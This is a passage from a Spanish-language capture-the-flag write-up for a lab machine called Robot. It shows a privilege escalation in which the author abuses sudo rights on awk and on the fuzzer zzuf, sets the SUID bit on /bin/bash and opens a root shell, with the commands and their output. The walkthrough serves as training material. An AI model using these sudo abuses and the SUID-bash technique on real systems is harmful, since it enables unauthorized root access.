<p><img src="/../machines/nyx/robot/gtfobins2.webp" alt="gtfobins2"></p>
<p>Paso de usuaria <strong>angela</strong> a  usuario <strong>tyrell</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">angela@robot:~$ sudo -u tyrell /usr/bin/awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;
</span></span><span class="line"><span class="cl">$ bash -i
</span></span><span class="line"><span class="cl">tyrell@robot:/home/angela$ id
</span></span><span class="line"><span class="cl">uid=1003(tyrell) gid=1003(tyrell) grupos=1003(tyrell)
</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tyrell@robot:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for tyrell on robot:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User tyrell may run the following commands on robot:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /usr/bin/zzuf
</span></span></code></pre></div><p>Consulto la ayuda del binario <strong>zzuf</strong> y veo que usando la <code>flag -c</code> puedo lanzar comandos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tyrell@robot:~$ /usr/bin/zzuf -help
</span></span><span class="line"><span class="cl">Usage: zzuf [-aAcdimnqSvx] [-s seed|-s start:stop] [-r ratio|-r min:max]
</span></span><span class="line"><span class="cl">              [-f mode] [-D delay] [-j jobs] [-C crashes] [-B bytes] [-a list]
</span></span><span class="line"><span class="cl">              [-t seconds] [-T seconds] [-M mebibytes] [-b ranges] [-p ports]
</span></span><span class="line"><span class="cl">              [-P protect] [-R refuse] [-l list] [-I include] [-E exclude]              [-O mode]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">              [PROGRAM [--] [ARGS]...]
</span></span><span class="line"><span class="cl">       zzuf -h | --help
</span></span><span class="line"><span class="cl">       zzuf -V | --version
</span></span><span class="line"><span class="cl">Run PROGRAM with optional arguments ARGS and fuzz its input.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  -c, --cmdline             only fuzz files specified in the command line
</span></span></code></pre></div><p>Lanzo <strong>zzuf</strong> con sudo y me devuelve el <strong>id</strong> de root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tyrell@robot:~$ sudo /usr/bin/zzuf -c id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) grupos=0(root)
</span></span></code></pre></div><p>Como me devuelve el <strong>id</strong> de root puedo obtener el root de la siguiente forma:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">tyrell@robot:~$ sudo /usr/bin/zzuf -c chmod 4755 /bin/bash
</span></span><span class="line"><span class="cl">tyrell@robot:~$ ls -la /bin/bash
</span></span><span class="line"><span class="cl">-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
</span></span><span class="line"><span class="cl">tyrell@robot:~$ bash -p
</span></span><span class="line"><span class="cl">bash-5.1# whoami
</span></span><span class="line"><span class="cl">root
</span></span></code></pre></div><p>Y aqu√≠ termina la m√°quina Robot.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2025 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
